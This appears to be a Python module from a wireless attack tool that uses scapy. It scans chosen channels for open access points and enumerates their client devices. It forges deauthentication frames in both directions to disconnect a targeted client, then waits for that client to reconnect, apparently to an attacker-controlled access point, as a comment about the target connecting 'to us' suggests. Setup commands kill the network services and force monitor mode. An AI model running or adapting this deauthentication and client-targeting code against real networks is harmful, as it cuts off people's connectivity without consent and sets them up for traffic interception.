from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Deauth

from ap_info import AccessPointInfo
from interface_manager import InterfaceManager
from process.process_executor import ProcessExecutor
from runtime_config import RuntimeConfig
from service_manager import ServiceManager


class WlanManager(object):
    DEFAULT_TIMEOUT_SECS_SCAN = 3

    def __init__(self, pe: ProcessExecutor, sm: ServiceManager, im: InterfaceManager, rc: RuntimeConfig):
        self._sm = sm
        self._im = im
        self._pe = pe
        self._rc = rc

    def reload_driver(self):
        # This is a hack to stop the rt2800usb driver from stop working when changing channels...
        self._pe.run('modprobe -r rt2800usb')
        self._pe.run('modprobe rt2800usb')
        time.sleep(5)

    def set_monitor(self, interface):
        # self.reload_driver()

        self._sm.stop_service("NetworkManager")
        self._pe.run("airmon-ng check kill")

        if not self._im.is_wlan_interface_in_monitor(interface):
            self._im.down(interface)
            self._pe.run("iwconfig {} mode monitor".format(interface))
            self._im.up(interface)

    def send_diassoc_packets(self, interface, endpoint_bssid, ap_bssid, send_count=50):
        try:
            diassoc_endpoint_to_ap = RadioTap() / Dot11(addr1=ap_bssid, addr2=endpoint_bssid) / Dot11Deauth()

            diaasoc_ap_to_endpoint = RadioTap() / Dot11(addr1=endpoint_bssid, addr2=ap_bssid) / Dot11Deauth()

            sendp(diassoc_endpoint_to_ap, count=send_count, iface=interface)
            sendp(diaasoc_ap_to_endpoint, count=send_count, iface=interface)
        except BaseException as e:
            print(e)

    def set_channel(self, interface, channel: int):
        self._im.up(interface)
        self._pe.run("iwconfig {} channel {}".format(interface, channel))

    def wait_for_endpoint_to_connect(self, interface, channel, endpoint_bssid, ap_bssid, should_stop_event: Event,
                                     endpoint_seen_event: Event):

        # time.sleep(30)
        self.set_monitor(interface)
        self.set_channel(interface, channel)

        print("Waiting to {} to talk to {}".format(endpoint_bssid, ap_bssid))

        def handle_packet(pkt):
            # pkt.show()
            if Dot11 in pkt and pkt[Dot11].addr2 == endpoint_bssid:
                # pkt.show()
                pass

        def stop_filter(pkt):
            if should_stop_event.is_set():
                return True

            if Dot11 in pkt:
                if pkt[Dot11].FCfield.from_DS == 0 \
                        and pkt[Dot11].FCfield.to_DS == 1 \
                        and pkt[Dot11].addr1 == ap_bssid \
                        and pkt[Dot11].addr2 == endpoint_bssid:
                    endpoint_seen_event.set()
                    # print("Seen our target connect to us!")
                    return True

            return False

        sniff(iface=interface, prn=handle_packet, stop_filter=stop_filter)

    def scan_for_endpoint_of_ap(self, interface, channel, bssid, timeout=DEFAULT_TIMEOUT_SECS_SCAN):
        self.set_monitor(interface)
        self.set_channel(interface, channel)

        endpoints_addrs = set()

        def handle_packet(pkt):
            if Dot11 in pkt:

                if pkt[Dot11].FCfield.from_DS == 0 \
                        and pkt[Dot11].FCfield.to_DS == 1 \
                        and pkt[Dot11].addr1 == bssid:
                    endpoints_addrs.add(pkt[Dot11].addr2)

        sniff(iface=interface, prn=handle_packet, timeout=timeout)
        return endpoints_addrs

    def scan_for_aps(self, interface, get_open_aps_only=True, timeout_per_channel=DEFAULT_TIMEOUT_SECS_SCAN):
        ap_list = {}  # {<ssid>: <AccessPointInfo>}
        self.set_monitor(interface)

        def handle_packet(pkt):
            if Dot11Beacon in pkt:
                stats = pkt[Dot11Beacon].network_stats()
                if 'OPN' not in stats.get('crypto', {}) and get_open_aps_only:
                    return

                if stats['ssid'] not in ap_list:
                    ap_list[stats['ssid']] = AccessPointInfo(channel=stats['channel'],
                                                             ssid=stats['ssid'],
                                                             crypto=stats['crypto'],
                                                             bssid=pkt[Dot11].addr2,
                                                             raw_stats=stats)

        for c in self._rc.attacked_channels:
            self.set_channel(interface, c)
            print(timeout_per_channel)
            sniff(iface=interface, prn=handle_packet, timeout=timeout_per_channel)

        return ap_list
